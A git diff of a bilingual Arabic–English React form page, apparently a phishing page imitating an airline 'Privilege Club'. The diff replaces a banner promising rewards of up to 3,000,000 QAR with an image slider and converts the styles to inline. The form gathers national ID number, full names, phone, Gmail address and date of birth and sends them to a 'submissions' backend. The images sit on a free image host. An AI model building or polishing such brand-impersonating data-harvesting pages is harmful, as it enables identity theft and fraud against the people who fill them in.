@@ -58,6 +58,25 @@ const countries = [
   { ar: "البرازيل", en: "Brazil", code: "+55" }
 ];
 
+const sliderImages = [
+  "https://i.ibb.co/prbY7X4y/IMG-20260718-WA0011.jpg",
+  "https://i.ibb.co/hRZYJfHN/IMG-20260718-WA0010.jpg",
+  "https://i.ibb.co/LDBRJyyS/IMG-20260718-WA0009.jpg",
+  "https://i.ibb.co/SXj5mWQR/IMG-20260718-WA0008.jpg",
+  "https://i.ibb.co/PzVjfnr0/IMG-20260718-WA0007.jpg",
+  "https://i.ibb.co/NgqDV0LF/IMG-20260718-WA0006.jpg",
+  "https://i.ibb.co/rKNQp5t5/IMG-20260718-WA0005.jpg",
+  "https://i.ibb.co/mCNvcQ2s/IMG-20260718-WA0001.jpg",
+  "https://i.ibb.co/gMWpGhwT/IMG-20260718-WA0002.jpg",
+  "https://i.ibb.co/ycrZw6z1/IMG-20260718-WA0003.jpg",
+  "https://i.ibb.co/FPSMwx7/IMG-20260718-WA0004.jpg",
+  "https://i.ibb.co/BH4fNcs0/h2-uefa-2024.jpg",
+  "https://i.ibb.co/2707Nb2Z/h2-jet-ski-qatar.jpg",
+  "https://i.ibb.co/fzZ25gZW/h2-f1-v2.jpg",
+  "https://i.ibb.co/s9w4ZzdB/PHL.jpg",
+  "https://i.ibb.co/x8Kq5Nfr/h2-visa-cug-china.jpg",
+];
+
 export default function PersonalData() {
   const [, setLocation] = useLocation();
   const { language } = useLanguage();
@@ -79,6 +98,15 @@ export default function PersonalData() {
     gender: isArabic ? "ذكر" : "Male",
     customerStatus: isArabic ? "عميل حالي" : "Existing Customer",
   });
+
+  const [currentSlide, setCurrentSlide] = useState(0);
+
+  useEffect(() => {
+    const timer = setInterval(() => {
+      setCurrentSlide((prev) => (prev + 1) % sliderImages.length);
+    }, 5000);
+    return () => clearInterval(timer);
+  }, []);
 
   const updateSubmissionMutation = trpc.submissions.updateSubmission.useMutation();
 
@@ -117,32 +145,39 @@ export default function PersonalData() {
 
   return (
     <div dir={isArabic ? "rtl" : "ltr"} style={{ margin: 0, padding: 0, fontFamily: 'sans-serif', backgroundColor: '#f4f4f4', minHeight: '100vh' }}>
-      <style>{`
-        .header-image { width: 100%; height: auto; display: block; }
-        .rewards-banner { background-color: #8C0032; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 16px; }
-        .rewards-line { margin: 5px 0; }
-        .form-container { max-width: 500px; margin: 20px auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .form-group { margin-bottom: 15px; text-align: ${isArabic ? 'right' : 'left'}; }
-        .form-group label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; font-size: 14px; }
-        .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; box-sizing: border-box; }
-        .birth-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
-        .phone-grid { display: grid; grid-template-columns: 100px 1fr; gap: 10px; }
-        .submit-btn { width: 100%; padding: 15px; background-color: #8C0032; color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .footer-image { width: 100%; height: auto; display: block; margin-top: 30px; }
-      `}</style>
-
-      <img src="https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg" className="header-image" alt="Header" />
-      
-      <div className="rewards-banner">
-        <div className="rewards-line">{isArabic ? "● جوائز سنوية تصل إلى 3,000,000 ريال قطري" : "● Annual rewards up to 3,000,000 QAR"}</div>
-        <div className="rewards-line">{isArabic ? "● خصومات عالمية تصل إلى 70%" : "● Global discounts up to 70%"}</div>
+      {/* Slider Section */}
+      <div style={{ width: '100%', position: 'relative', height: '200px', overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+        {sliderImages.map((image, index) => (
+          <img 
+            key={index}
+            src={image} 
+            style={{ 
+              width: '100%', 
+              height: '100%', 
+              objectFit: 'cover', 
+              position: 'absolute', 
+              top: 0, 
+              left: 0, 
+              zIndex: 1, 
+              transition: 'opacity 1.5s ease-in-out',
+              opacity: currentSlide === index ? 1 : 0
+            }}
+            alt="Privilege Club Banner"
+          />
+        ))}
+        <div style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.3)', zIndex: 2 }}></div>
+        <div style={{ position: 'relative', zIndex: 3, textAlign: 'center', color: 'white', padding: '20px', maxWidth: '800px' }}>
+          <h1 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '10px', textShadow: '0 2px 4px rgba(0,0,0,0.5)' }}>
+            {isArabic ? "أكمل بياناتك الشخصية" : "Complete Your Personal Data"}
+          </h1>
+        </div>
       </div>
 
-      <div className="form-container">
+      <div style={{ maxWidth: '500px', margin: '-50px auto 20px auto', background: 'white', padding: '25px', borderRadius: '10px', boxShadow: '0 4px 15px rgba(0,0,0,0.1)', position: 'relative', zIndex: 10 }}>
         <form onSubmit={handleSubmit}>
-          <div className="form-group">
-            <label>{isArabic ? "اللقب" : "Title"}</label>
-            <select name="title" value={formData.title} onChange={handleChange} required>
+          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
+            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "اللقب" : "Title"}</label>
+            <select name="title" value={formData.title} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
               <option value="">{isArabic ? "-- اختر اللقب --" : "-- Select Title --"}</option>
               {titles.map((t, i) => (
                 <option key={i} value={isArabic ? t.ar : t.en}>{isArabic ? t.ar : t.en}</option>
@@ -150,63 +185,63 @@ export default function PersonalData() {
             </select>
           </div>
 
-          <div className="form-group">
-            <label>{isArabic ? "الاسم كما في الهوية (بالإنجليزي)" : "Name as in ID (English)"}</label>
-            <input type="text" name="nameEnglish" placeholder="Full Name" value={formData.nameEnglish} onChange={handleChange} required />
+          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
+            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "الاسم كما في الهوية (بالإنجليزي)" : "Name as in ID (English)"}</label>
+            <input type="text" name="nameEnglish" placeholder="Full Name" value={formData.nameEnglish} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }} />
           </div>
 
-          <div className="form-group">
-            <label>{isArabic ? "الاسم (بالعربي)" : "Name (Arabic)"}</label>
-            <input type="text" name="nameArabic" placeholder="الاسم الكامل" value={formData.nameArabic} onChange={handleChange} required />
+          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
+            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "الاسم (بالعربي)" : "Name (Arabic)"}</label>
+            <input type="text" name="nameArabic" placeholder="الاسم الكامل" value={formData.nameArabic} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }} />
           </div>
 
-          <div className="form-group">
-            <label>{isArabic ? "رقم الهوية" : "ID Number"}</label>
-            <input type="number" name="idNumber" placeholder={isArabic ? "رقم الهوية" : "ID Number"} value={formData.idNumber} onChange={handleChange} required />
+          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
+            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "رقم الهوية" : "ID Number"}</label>
+            <input type="number" name="idNumber" placeholder={isArabic ? "رقم الهوية" : "ID Number"} value={formData.idNumber} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }} />
           </div>
 
-          <div className="form-group">
-            <label>{isArabic ? "بلد الإقامة" : "Country of Residence"}</label>
-            <select name="residence" value={formData.residence} onChange={handleChange} required>
+          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
+            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "بلد الإقامة" : "Country of Residence"}</label>
+            <select name="residence" value={formData.residence} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
               {countries.map((c, i) => (
                 <option key={i} value={isArabic ? c.ar : c.en}>{isArabic ? c.ar : c.en}</option>
               ))}
             </select>
           </div>
 
-          <div className="form-group">
-            <label>{isArabic ? "رقم الجوال" : "Phone Number"}</label>
-            <div className="phone-grid">
-              <select name="countryCode" value={formData.countryCode} onChange={handleChange} required>
+          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
+            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "رقم الجوال" : "Phone Number"}</label>
+            <div style={{ display: 'grid', gridTemplateColumns: '100px 1fr', gap: '10px' }}>
+              <select name="countryCode" value={formData.countryCode} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
                 {countries.map((c, i) => (
                   <option key={i} value={c.code}>{c.code} ({isArabic ? c.ar : c.en})</option>
                 ))}
               </select>
-              <input type="number" name="phoneNumber" placeholder="XXXXXXXX" value={formData.phoneNumber} onChange={handleChange} required />
+              <input type="number" name="phoneNumber" placeholder="XXXXXXXX" value={formData.phoneNumber} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }} />
             </div>
           </div>
 
-          <div className="form-group">
-            <label>{isArabic ? "البريد الإلكتروني (Gmail)" : "Email (Gmail)"}</label>
-            <input type="email" name="email" placeholder="example@gmail.com" value={formData.email} onChange={handleChange} required />
+          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
+            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "البريد الإلكتروني (Gmail)" : "Email (Gmail)"}</label>
+            <input type="email" name="email" placeholder="example@gmail.com" value={formData.email} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }} />
           </div>
 
-          <div className="form-group">
-            <label>{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
-            <div className="birth-grid">
-              <select name="birthDay" value={formData.birthDay} onChange={handleChange} required>
+          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
+            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '10px' }}>
+              <select name="birthDay" value={formData.birthDay} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
                 <option value="">{isArabic ? "يوم" : "Day"}</option>
                 {Array.from({ length: 31 }, (_, i) => i + 1).map(d => (
                   <option key={d} value={d}>{d}</option>
                 ))}
               </select>
-              <select name="birthMonth" value={formData.birthMonth} onChange={handleChange} required>
+              <select name="birthMonth" value={formData.birthMonth} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
                 <option value="">{isArabic ? "شهر" : "Month"}</option>
                 {Array.from({ length: 12 }, (_, i) => i + 1).map(m => (
                   <option key={m} value={m}>{m}</option>
                 ))}
               </select>
-              <select name="birthYear" value={formData.birthYear} onChange={handleChange} required>
+              <select name="birthYear" value={formData.birthYear} onChange={handleChange} required style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
                 <option value="">{isArabic ? "سنة" : "Year"}</option>
                 {Array.from({ length: 100 }, (_, i) => new Date().getFullYear() - i).map(y => (
                   <option key={y} value={y}>{y}</option>
@@ -215,29 +250,29 @@ export default function PersonalData() {
             </div>
           </div>
 
-          <div className="form-group">
-            <label>{isArabic ? "النوع" : "Gender"}</label>
-            <select name="gender" value={formData.gender} onChange={handleChange}>
+          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
+            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "النوع" : "Gender"}</label>
+            <select name="gender" value={formData.gender} onChange={handleChange} style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
               <option value={isArabic ? "ذكر" : "Male"}>{isArabic ? "ذكر" : "Male"}</option>
               <option value={isArabic ? "أنثى" : "Female"}>{isArabic ? "أنثى" : "Female"}</option>
             </select>
           </div>
 
-          <div className="form-group">
-            <label>{isArabic ? "حالة العميل" : "Customer Status"}</label>
-            <select name="customerStatus" value={formData.customerStatus} onChange={handleChange}>
+          <div style={{ marginBottom: '15px', textAlign: isArabic ? 'right' : 'left' }}>
+            <label style={{ display: 'block', marginBottom: '8px', fontWeight: 'bold', color: '#333', fontSize: '14px' }}>{isArabic ? "حالة العميل" : "Customer Status"}</label>
+            <select name="customerStatus" value={formData.customerStatus} onChange={handleChange} style={{ width: '100%', padding: '12px', border: '1px solid #ccc', borderRadius: '5px', fontSize: '14px', boxSizing: 'border-box' }}>
               <option value={isArabic ? "عميل حالي" : "Existing Customer"}>{isArabic ? "عميل حالي" : "Existing Customer"}</option>
               <option value={isArabic ? "عميل جديد" : "New Customer"}>{isArabic ? "عميل جديد" : "New Customer"}</option>
             </select>
           </div>
 
-          <button type="submit" className="submit-btn">
+          <button type="submit" style={{ width: '100%', padding: '15px', backgroundColor: '#8C0032', color: 'white', border: 'none', borderRadius: '5px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer', marginTop: '10px' }}>
             {isArabic ? "متابعة" : "Continue"}
           </button>
         </form>
       </div>
 
-      <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
+      <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" style={{ width: '100%', height: 'auto', display: 'block', marginTop: '30px' }} alt="Footer" />
     </div>
   );
 }
